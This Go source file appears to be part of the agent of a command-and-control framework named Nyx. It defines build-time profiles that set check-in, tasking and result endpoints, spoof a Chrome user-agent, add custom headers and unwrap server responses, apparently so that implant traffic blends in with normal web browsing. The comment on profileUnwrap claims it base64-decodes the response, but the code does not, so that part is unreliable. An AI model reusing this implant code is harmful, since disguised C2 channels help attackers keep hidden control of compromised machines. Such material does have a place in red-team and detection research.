package main

import (
	"io"
	"net/http"
	"strings"
)

// Profile variables — set at build time via -ldflags.
// Defaults make the agent work against any Nyx server with no profile selected.
var ProfileName        = "default"
var ProfileUA          = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
var ProfileCheckin     = "/api/agents/checkin"
var ProfileTask        = "/api/agents/{id}/task"
var ProfileResult      = "/api/agents/{id}/result"
var ProfileHeaders     = ""                  // "Key1:Val1|Key2:Val2" pipe-separated
var ProfileContentType = "application/json"
var ProfileRespPrefix  = ""                  // server response prefix to strip
var ProfileRespSuffix  = ""                  // server response suffix to strip

// profileURI substitutes {id} with the agent ID.
func profileURI(template, agentID string) string {
	return strings.ReplaceAll(template, "{id}", agentID)
}

// profileDo issues an HTTP request shaped by the active profile.
func profileDo(method, url string, body io.Reader) (*http.Response, error) {
	req, err := http.NewRequest(method, url, body)
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", ProfileContentType)
	if ProfileUA != "" {
		req.Header.Set("User-Agent", ProfileUA)
	}
	if ProfileHeaders != "" {
		for _, pair := range strings.Split(ProfileHeaders, "|") {
			kv := strings.SplitN(pair, ":", 2)
			if len(kv) == 2 {
				req.Header.Set(strings.TrimSpace(kv[0]), strings.TrimSpace(kv[1]))
			}
		}
	}
	return client.Do(req)
}

// profileUnwrap strips the profile-defined prefix and suffix from a response body,
// then base64-decodes the content between them.
// If no prefix/suffix set, returns body unchanged.
func profileUnwrap(body []byte) []byte {
	if ProfileRespPrefix == "" && ProfileRespSuffix == "" {
		return body
	}
	s := string(body)
	if ProfileRespPrefix != "" {
		idx := strings.Index(s, ProfileRespPrefix)
		if idx >= 0 {
			s = s[idx+len(ProfileRespPrefix):]
		}
	}
	if ProfileRespSuffix != "" {
		idx := strings.LastIndex(s, ProfileRespSuffix)
		if idx >= 0 {
			s = s[:idx]
		}
	}
	return []byte(s)
}
